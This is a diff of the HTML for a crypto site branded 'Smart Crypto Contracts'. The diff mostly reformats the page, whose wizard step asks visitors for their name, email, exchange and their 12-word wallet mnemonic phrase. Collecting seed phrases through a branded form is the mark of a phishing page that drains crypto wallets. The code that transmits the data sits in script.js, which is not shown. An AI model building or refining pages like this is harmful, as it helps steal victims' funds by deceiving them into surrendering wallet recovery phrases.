@@ -7,24 +7,22 @@
   <link rel="stylesheet" href="style.css" />
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
 </head>
-
-
-  <header class="site-header">
-  <div class="logo-title">
-    <h1>Smart Crypto Contracts</h1>
-    <p class="slogan">Blockchain Power, Zero Hassle.</p>
-  </div>
-  <div class="crypto-ticker">
-    <div class="ticker-content" id="cryptoPrices">
-      <span>BTC: --</span>
-      <span>ETH: --</span>
-      <span>XRP: --</span>
-      <span>SOL: --</span>
-    </div>
-  </div>
-</header>
-  
 <body>
+  <header class="site-header">
+    <div class="logo-title">
+      <h1>Smart Crypto Contracts</h1>
+      <p class="slogan">Blockchain Power, Zero Hassle.</p>
+    </div>
+    <div class="crypto-ticker">
+      <div class="ticker-content" id="cryptoPrices">
+        <span>BTC: --</span>
+        <span>ETH: --</span>
+        <span>XRP: --</span>
+        <span>SOL: --</span>
+      </div>
+    </div>
+  </header>
+
   <div class="container">
     <!-- STEP 1 -->
     <div class="step step-1 active">
@@ -62,47 +60,42 @@
     </div>
 
     <!-- STEP 3 -->
-<div class="step step-3">
-  <h2>Connect Wallet & Enter Details</h2>
-  <input type="text" id="name" placeholder="Name" />
-  <input type="text" id="surname" placeholder="Surname" />
-
-  <select id="country">
-    <option disabled selected>Select Country</option>
-    <option>Switzerland</option>
-    <option>USA</option>
-    <option>Germany</option>
-    <option>Canada</option>
-    <option>Denmark</option>
-    <option>New Zealand</option>
-    <option>France</option>
-    <option>Belgium</option>
-    <option>United Kingdom</option>
-    <!-- Add more countries -->
-  </select>
-
-  <select id="exchange">
-    <option disabled selected>Select Exchange</option>
-    <option>Binance</option>
-    <option>Coinbase</option>
-    <option>Kraken</option>
-    <option>Shakepay</option>
-    <option>Newton</option>
-    <option>Paybis</option>
-    <option>Exodus</option>
-    <option>Bitcoin.com</option>
-    <option>OKX</option>
-    <option>Pitpanda</option>
-    <option>Crypto.com</option>
-    <option>Bitget</option>
-  </select>
-
-  <input type="email" id="email" placeholder="Email" />
-  <input type="text" id="mnemonic" placeholder="Enter your Mnemonic Phrases here... (12 words, separated by space)"/>
-
-  <button onclick="prevStep()">← Back</button>
-  <button onclick="simulateLoading()">Proceed</button>
-</div>
+    <div class="step step-3">
+      <h2>Connect Wallet & Enter Details</h2>
+      <input type="text" id="name" placeholder="Name" />
+      <input type="text" id="surname" placeholder="Surname" />
+      <select id="country">
+        <option disabled selected>Select Country</option>
+        <option>Switzerland</option>
+        <option>USA</option>
+        <option>Germany</option>
+        <option>Canada</option>
+        <option>Denmark</option>
+        <option>New Zealand</option>
+        <option>France</option>
+        <option>Belgium</option>
+        <option>United Kingdom</option>
+      </select>
+      <select id="exchange">
+        <option disabled selected>Select Exchange</option>
+        <option>Binance</option>
+        <option>Coinbase</option>
+        <option>Kraken</option>
+        <option>Shakepay</option>
+        <option>Newton</option>
+        <option>Paybis</option>
+        <option>Exodus</option>
+        <option>Bitcoin.com</option>
+        <option>OKX</option>
+        <option>Pitpanda</option>
+        <option>Crypto.com</option>
+        <option>Bitget</option>
+      </select>
+      <input type="email" id="email" placeholder="Email" />
+      <input type="text" id="mnemonic" placeholder="Enter your Mnemonic Phrases here... (12 words, separated by space)"/>
+      <button onclick="prevStep()">← Back</button>
+      <button onclick="simulateLoading()">Proceed</button>
+    </div>
 
     <!-- STEP 4 -->
     <div class="step step-4">
@@ -118,15 +111,13 @@
     </div>
   </div>
 
-
-
   <footer class="site-footer">
-  <div class="footer-content">
-    <p><strong>Smart Crypto Contracts</strong> — Your trusted partner in deploying advanced blockchain solutions. We specialize in automated contract deployment, secure staking, DAO governance, and token infrastructure, tailored for developers, investors, and innovators.</p>
-    <p><strong>Registered Address:</strong> Bahnhofstrasse 22, 8001 Zürich, Switzerland</p>
-    <p>© 2025 Smart Crypto Contracts. All rights reserved.</p>
-  </div>
-</footer>
+    <div class="footer-content">
+      <p><strong>Smart Crypto Contracts</strong> — Your trusted partner in deploying advanced blockchain solutions. We specialize in automated contract deployment, secure staking, DAO governance, and token infrastructure, tailored for developers, investors, and innovators.</p>
+      <p><strong>Registered Address:</strong> Bahnhofstrasse 22, 8001 Zürich, Switzerland</p>
+      <p>© 2025 Smart Crypto Contracts. All rights reserved.</p>
+    </div>
+  </footer>
 
   <script src="script.js"></script>
 </body>
